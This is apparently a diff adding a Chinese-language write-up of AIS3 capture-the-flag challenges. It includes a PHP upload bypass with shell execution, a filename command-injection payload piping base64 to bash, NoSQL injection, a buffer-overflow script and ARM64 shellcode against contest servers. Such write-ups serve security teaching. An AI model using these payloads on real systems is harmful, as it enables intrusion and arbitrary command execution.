+<img width="800" alt="strings-memcpy-flag" src="https://user-images.githubusercontent.com/38059464/176867668-cc0d418b-b9a6-4b2b-bf74-fcfb4206f8ff.png" />
+<img width="348" alt="strings-some-index" src="https://user-images.githubusercontent.com/38059464/176869148-23affeb7-168a-4652-9f0f-9d58fc3b7a49.png" /></li>
+  <li>
+    <p>驗證上述猜測便是 flag。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="n">flags</span> <span class="o">=</span> <span class="p">[</span><span class="s">'AIS3{'</span><span class="p">,</span> <span class="s">'good'</span><span class="p">,</span> <span class="s">'luck'</span><span class="p">,</span> <span class="s">'finding'</span><span class="p">,</span> <span class="s">'the'</span><span class="p">,</span> <span class="s">'flags'</span><span class="p">,</span> <span class="s">'value'</span><span class="p">,</span> <span class="s">'using'</span><span class="p">,</span> <span class="s">'strings'</span><span class="p">,</span>
+         <span class="s">'command'</span><span class="p">,</span> <span class="s">'guess'</span><span class="p">,</span> <span class="s">'which'</span><span class="p">,</span> <span class="s">'substring'</span><span class="p">,</span> <span class="s">'is'</span><span class="p">,</span> <span class="s">'our'</span><span class="p">,</span> <span class="s">'actual'</span><span class="p">,</span> <span class="s">'answer'</span><span class="p">,</span> <span class="s">'lmaoo'</span><span class="p">,</span> <span class="s">'}'</span><span class="p">]</span>
+<span class="n">indexes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">]</span>
+   
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indexes</span><span class="p">:</span>
+    <span class="n">flag</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">flags</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+   
+<span class="k">print</span><span class="p">(</span><span class="s">'_'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{_the_answer_is_guess_the_strings_using_good_luck_}</code></p>
+
+<h2 id="web">Web</h2>
+
+<h3 id="poking-bear">Poking Bear</h3>
+
+<ol>
+  <li>網頁上顯示的 bear 的 URL 為 <code class="language-plaintext highlighter-rouge">/bear/&lt;n&gt;</code>，因此猜測要找的 bear 應該也是同樣的格式。</li>
+  <li>
+    <p>產生 <code class="language-plaintext highlighter-rouge">0</code> ~ <code class="language-plaintext highlighter-rouge">1000</code> 的 wordlist <code class="language-plaintext highlighter-rouge">bear.txt</code>，然後用 <code class="language-plaintext highlighter-rouge">ffuf</code> 進行爆搜，並將沒有 bear 的結果過濾掉。找到唯一不在網頁上的 bear <code class="language-plaintext highlighter-rouge">499</code> 即為 secret bear。</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://chals1.ais3.org:8987/bear/FUZZ <span class="nt">-w</span> ./bear.txt | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'Size: 1358 ./fuzz_bear.txt
+5                       [Status: 200, Size: 1742, Words: 295, Lines: 42]
+29                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
+82                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
+327                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
+350                     [Status: 200, Size: 1740, Words: 295, Lines: 42]
+499                     [Status: 200, Size: 1847, Words: 335, Lines: 46]
+777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
+999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>需要成為 <code class="language-plaintext highlighter-rouge">bear poker</code>，因此將 Cookie 的 <code class="language-plaintext highlighter-rouge">human</code> 設成 <code class="language-plaintext highlighter-rouge">bear poker</code>，再 poke 一次就拿到 flag。</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl http://chals1.ais3.org:8987/bear/499
+Hello human, you need to be a <span class="s2">"bear poker"</span> to poke the SECRET BEAR.
+<span class="nv">$ </span>curl http://chals1.ais3.org:8987/poke <span class="nt">-H</span> <span class="s1">'Cookie: human=bear poker'</span> <span class="nt">-d</span> <span class="s1">'bear _id=499'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span>
+&lt;script&gt;alert<span class="o">(</span><span class="sb">`</span>AIS3<span class="o">{</span>y0u_P0l&lt;3_7h3_Bear_H@rdLy&gt;&lt;<span class="o">}</span><span class="sb">`</span><span class="o">)</span><span class="p">;</span> <span class="nv">location</span><span class="o">=</span><span class="s1">'/'</span>&lt;/script&gt;
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{y0u_P0l&lt;3_7h3_Bear_H@rdLy&gt;&lt;}</code></p>
+
+<h3 id="simple-file-uploader">Simple File Uploader</h3>
+
+<ol>
+  <li>不能上傳 <code class="language-plaintext highlighter-rouge">php</code>, <code class="language-plaintext highlighter-rouge">php2</code>, <code class="language-plaintext highlighter-rouge">php3</code>, <code class="language-plaintext highlighter-rouge">php4</code>, <code class="language-plaintext highlighter-rouge">php5</code>, <code class="language-plaintext highlighter-rouge">php6</code>, <code class="language-plaintext highlighter-rouge">phar</code>, <code class="language-plaintext highlighter-rouge">phtm</code>，可以用 <code class="language-plaintext highlighter-rouge">pHP</code> bypass 檢查。</li>
+  <li>
+    <p>Ban 掉一堆危險 function，可以用 ``` 執行 shell command 讀取 flag。</p>
+
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">echo</span><span class="p">(</span><span class="sb">`/rUn_M3_t0_9et_fL4g`</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> 忘了留…</p>
+
+<h3 id="tari-tari">Tari Tari</h3>
+
+<ol>
+  <li>上傳 <code class="language-plaintext highlighter-rouge">trash.txt</code> 後，網頁提供的下載網址為 <code class="language-plaintext highlighter-rouge">http://chals1.ais3.org:9453/download.php?file=MjY1MDEwZmI2MDg2NGU1MGFjZTg5Y2RkYjE4ZmQxZjIudGFyLmd6&amp;name=trash.txt.tar.gz</code>。把 <code class="language-plaintext highlighter-rouge">file</code> base64 decode 得到 <code class="language-plaintext highlighter-rouge">265010fb60864e50ace89cddb18fd1f2.tar.gz</code>，由此猜測 <code class="language-plaintext highlighter-rouge">file</code> 可以讀取任意檔案。</li>
+  <li>
+    <p>讀取 <code class="language-plaintext highlighter-rouge">index.php</code>，發現其使用 <code class="language-plaintext highlighter-rouge">passthru</code> 執行 shell command，而 <code class="language-plaintext highlighter-rouge">$filename</code> 為使用者可控，因此可以 RCE。</p>
+
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+<span class="nv">$path</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">".tar.gz"</span><span class="p">;</span>
+<span class="nv">$source</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nv">$destination</span> <span class="o">=</span> <span class="s2">"./files/</span><span class="nv">$path</span><span class="s2">"</span><span class="p">;</span>
+<span class="nb">passthru</span><span class="p">(</span><span class="s2">"tar czf '</span><span class="nv">$destination</span><span class="s2">' --transform='s|</span><span class="nv">$source</span><span class="s2">|</span><span class="nv">$filename</span><span class="s2">|' --directory='/tmp' '/</span><span class="nv">$source</span><span class="s2">'"</span><span class="p">,</span> <span class="nv">$return</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>上傳檔案即可讀到 flag。</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo </span>abc <span class="o">&gt;</span>  <span class="s2">"'|| echo </span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nb">cat</span> /y000000_i_am_the_f14GGG.txt | <span class="nb">base64</span><span class="si">)</span><span class="s2"> | base64 -d | bash;#"</span>
+<span class="nv">$ </span><span class="nb">ls
+</span>total 32K
+<span class="nt">-rw-r--r--</span> 1 ice1187 ice1187    0 May 15 18:16 <span class="s1">''</span><span class="se">\'</span><span class="s1">'|| echo Y2F0IC95MDAwMDAwX2lfYW1fdGhlX2YxNEdHRy50eHQ= | base64 -d | bash;#'</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{test_flag (to be changed)}</code> (這個 flag 有夠迷惑…)</p>
+
+<h3 id="the-best-login-ui">The Best Login UI</h3>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">bodyParser.urlencoded</code> 中設定 <code class="language-plaintext highlighter-rouge">extended = true</code>，表示 <a href="https://www.npmjs.com/package/body-parser#extended">HTTP 傳入的參數會被當作 object</a>，而非 string。再加上使用 MongoDB，因此可以嘗試 NoSQL injection。
+<img width="556" alt="the-best-login-ui-extended" src="https://user-images.githubusercontent.com/38059464/176656006-0c26cfd0-bfbc-4bda-8651-2e4b81e21344.png" /></li>
+  <li>確認可以做 NoSQL injection (<a href="https://www.mongodb.com/docs/manual/reference/operator/query/">MongoDB query syntax</a>)。
+<img width="654" alt="the-best-login-ui-nosql-injection" src="https://user-images.githubusercontent.com/38059464/176657306-5a465ed2-8004-480b-8546-3b3c0a6f68eb.png" /></li>
+  <li>使用 <a href="https://www.mongodb.com/docs/manual/reference/operator/query/regex/#mongodb-query-op.-regex"><code class="language-plaintext highlighter-rouge">$regex</code></a> 把 flag 爆出來，當時寫的 script 超醜就不貼了…。</li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}</code></p>
+
+<h2 id="pwn">Pwn</h2>
+
+<h3 id="saas--crash">SAAS — Crash</h3>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">String</code> 的 <a href="https://en.cppreference.com/w/cpp/language/destructor">destructor</a> 會把 <code class="language-plaintext highlighter-rouge">str</code> delete 掉，但沒有把 <code class="language-plaintext highlighter-rouge">str</code> 設回 <code class="language-plaintext highlighter-rouge">nullptr</code>，留下 dangling pointer。而 <code class="language-plaintext highlighter-rouge">print</code> 會呼叫 <a href="https://en.cppreference.com/w/cpp/language/copy_constructor">copy constructor</a> 把 <code class="language-plaintext highlighter-rouge">s</code> 的 member 都 copy 過來，然後在 <code class="language-plaintext highlighter-rouge">print</code> 結束時呼叫 <code class="language-plaintext highlighter-rouge">String</code> 的 destructor 把 <code class="language-plaintext highlighter-rouge">s</code> 清掉，因此只要連續 <code class="language-plaintext highlighter-rouge">print</code> 兩次，就可以 double free <code class="language-plaintext highlighter-rouge">s.str</code>。</p>
+
+    <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">String</span> <span class="p">{</span>
+   <span class="nl">public:</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
+   
+    <span class="n">String</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+        <span class="n">str</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="o">~</span><span class="n">String</span><span class="p">()</span> <span class="p">{</span> <span class="k">delete</span><span class="p">[]</span> <span class="n">str</span><span class="p">;</span> <span class="p">}</span>
+<span class="p">};</span>
+   
+<span class="kt">void</span> <span class="nf">print</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Length: %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">str</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>建立 string 之後 print 兩次得到 flag。</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre><span class="o">=====</span> S<span class="o">(</span>tring<span class="o">)</span>AAS <span class="o">=====</span>
+1. Create string
+2. Edit string
+3. Print string
+4. Delete string
+<span class="o">&gt;</span> 1
+Index: 0
+Content: aaaa
+<span class="o">=====</span> S<span class="o">(</span>tring<span class="o">)</span>AAS <span class="o">=====</span>
+1. Create string
+2. Edit string
+3. Print string
+4. Delete string
+<span class="o">&gt;</span> 3
+Index: 0
+Length: 4
+Content: aaaa
+<span class="o">=====</span> S<span class="o">(</span>tring<span class="o">)</span>AAS <span class="o">=====</span>
+1. Create string
+2. Edit string
+3. Print string
+4. Delete string
+<span class="o">&gt;</span> 3
+Index: 0
+Length: 4
+Content:
+free<span class="o">()</span>: double free detected <span class="k">in </span>tcache 2
+Aborted <span class="o">(</span>core dumped<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}</code></p>
+
+<h3 id="bof2win">BOF2WIN</h3>
+
+<ol>
+  <li>
+    <p>純粹的 stack buffer overflow。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+   
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">12347</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals1.ais3.org'</span><span class="p">,</span> <span class="mi">12347</span><span class="p">)</span>
+   
+<span class="n">flag_adr</span> <span class="o">=</span> <span class="mh">0x401216</span>
+   
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">24</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">flag_adr</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+   
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{Re@1_B0F_m4st3r!!}</code></p>
+
+<h3 id="give-me-sc">Give Me SC</h3>
+
+<ol>
+  <li>
+    <p>不會寫 ARM64 shellcode 就上網找一份來用。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+   
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">15566</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals1.ais3.org'</span><span class="p">,</span> <span class="mi">15566</span><span class="p">)</span>
+   
+<span class="c1"># ref: https://www.exploit-db.com/exploits/47048
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4</span><span class="s">"</span>
+   
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'AAAA'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'cat home/give_me_sc/flag'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+<span class="c1"># p.interactive()
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{Y0uR_f1rst_Aarch64_Shellcoding}</code></p>
+
+<h3 id="magic">Magic</h3>
+
+<ol>
+  <li>嘗試幾次輸入之後，會發現有時候會突然 read 或 write 很多 bytes。</li>
+  <li>
+    <p>用 <code class="language-plaintext highlighter-rouge">gdb</code> 追進去發現正常 <code class="language-plaintext highlighter-rouge">read</code> 結束後會另外計算 <code class="language-plaintext highlighter-rouge">read</code> 和 <code class="language-plaintext highlighter-rouge">write</code> 的次數。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre>   <span class="mh">0x401d06</span>    <span class="n">push</span>   <span class="n">rax</span>
+   <span class="mh">0x401d07</span>    <span class="n">push</span>   <span class="n">rdi</span>
+   <span class="mh">0x401d08</span>    <span class="n">push</span>   <span class="n">rsi</span>
+   <span class="mh">0x401d09</span>    <span class="n">push</span>   <span class="n">rdx</span>
+   <span class="mh">0x401d0a</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="mi">1</span>
+   <span class="mh">0x401d11</span>    <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="mi">0</span>
+   <span class="mh">0x401d18</span>    <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span> <span class="mh">0x404f20</span>
+   <span class="mh">0x401d1f</span>    <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span> <span class="mi">5</span>
+   <span class="mh">0x401d26</span>    <span class="n">syscall</span>              <span class="o">//</span> <span class="n">write</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mh">0x404f20</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+   <span class="mh">0x401d28</span>    <span class="n">pop</span>    <span class="n">rdx</span>
+   <span class="mh">0x401d29</span>    <span class="n">pop</span>    <span class="n">rsi</span>
+   <span class="mh">0x401d2a</span>    <span class="n">pop</span>    <span class="n">rdi</span>
+   <span class="mh">0x401d2b</span>    <span class="n">pop</span>    <span class="n">rax</span>
+   <span class="mh">0x401d2c</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="mh">0x404f00</span>
+   <span class="mh">0x401d33</span>    <span class="n">add</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span> <span class="mi">1</span>
+   <span class="mh">0x401d37</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
+   <span class="mh">0x401d3a</span>    <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span> <span class="mh">0x404f08</span>
+   <span class="mh">0x401d41</span>    <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+   <span class="mh">0x401d44</span>    <span class="n">mov</span>    <span class="n">r8</span><span class="p">,</span> <span class="mh">0x404f10</span>          <span class="o">//</span> <span class="n">original</span> <span class="n">read</span>
+   <span class="mh">0x401d4b</span>    <span class="n">mov</span>    <span class="n">r8</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">r8</span><span class="p">]</span>
+   <span class="mh">0x401d4e</span>    <span class="nb">cmp</span>    <span class="n">rax</span><span class="p">,</span> <span class="mh">0xe</span>     <span class="o">//</span> <span class="n">check</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x404f00</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xe</span>
+   <span class="mh">0x401d52</span>    <span class="n">jne</span>    <span class="mh">0x401d61</span>
+   <span class="mh">0x401d54</span>    <span class="nb">cmp</span>    <span class="n">rbx</span><span class="p">,</span><span class="mh">0x8</span>      <span class="o">//</span> <span class="n">check</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x404f08</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x8</span>
+   <span class="mh">0x401d58</span>    <span class="n">jne</span>    <span class="mh">0x401d61</span>
+   <span class="mh">0x401d5a</span>    <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span><span class="mh">0x1000</span>
+   <span class="mh">0x401d61</span>    <span class="n">jmp</span>    <span class="n">r8</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">write</code> 也有同樣的操作。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre>   <span class="mh">0x401e00</span>    <span class="n">push</span>   <span class="n">rax</span>
+   <span class="mh">0x401e01</span>    <span class="n">push</span>   <span class="n">rdi</span>
+   <span class="mh">0x401e02</span>    <span class="n">push</span>   <span class="n">rsi</span>
+   <span class="mh">0x401e03</span>    <span class="n">push</span>   <span class="n">rdx</span>
+   <span class="mh">0x401e04</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x1</span>
+   <span class="mh">0x401e0b</span>    <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x401e12</span>    <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="mh">0x404f28</span>
+   <span class="mh">0x401e19</span>    <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span><span class="mh">0x5</span>
+   <span class="mh">0x401e20</span>    <span class="n">syscall</span>
+   <span class="mh">0x401e22</span>    <span class="n">pop</span>    <span class="n">rdx</span>
+   <span class="mh">0x401e23</span>    <span class="n">pop</span>    <span class="n">rsi</span>
+   <span class="mh">0x401e24</span>    <span class="n">pop</span>    <span class="n">rdi</span>
+   <span class="mh">0x401e25</span>    <span class="n">pop</span>    <span class="n">rax</span>
+   <span class="mh">0x401e26</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x404f08</span>
+   <span class="mh">0x401e2d</span>    <span class="n">add</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="mh">0x1</span>
+   <span class="mh">0x401e31</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
+   <span class="mh">0x401e34</span>    <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span><span class="mh">0x404f00</span>
+   <span class="mh">0x401e3b</span>    <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+   <span class="mh">0x401e3e</span>    <span class="n">mov</span>    <span class="n">r8</span><span class="p">,</span><span class="mh">0x404f18</span>
+   <span class="mh">0x401e45</span>    <span class="n">mov</span>    <span class="n">r8</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r8</span><span class="p">]</span>
+   <span class="mh">0x401e48</span>    <span class="nb">cmp</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x3</span>
+   <span class="mh">0x401e4c</span>    <span class="n">jne</span>    <span class="mh">0x401e5b</span>
+   <span class="mh">0x401e4e</span>    <span class="nb">cmp</span>    <span class="n">rbx</span><span class="p">,</span><span class="mh">0x7</span>
+   <span class="mh">0x401e52</span>    <span class="n">jne</span>    <span class="mh">0x401e5b</span>
+   <span class="mh">0x401e54</span>    <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span><span class="mh">0x100</span>
+   <span class="mh">0x401e5b</span>    <span class="n">jmp</span>    <span class="n">r8</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
